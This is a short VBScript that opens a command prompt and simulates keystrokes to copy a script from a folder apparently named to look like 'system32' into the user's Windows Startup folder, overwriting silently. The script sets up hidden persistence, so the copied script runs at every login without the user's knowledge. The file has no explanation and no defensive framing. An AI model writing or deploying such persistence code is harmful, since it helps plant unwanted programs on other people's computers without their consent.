Set objShell = CreateObject ("Wscript.Shell") 
objShell.Run "cmd.exe  /K" 

WScript.Sleep 50
objShell.SendKeys "xcopy C:\syse32\run.vbs  {%}USERPROFILE{%}""\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"" /Y /c & exit{enter}"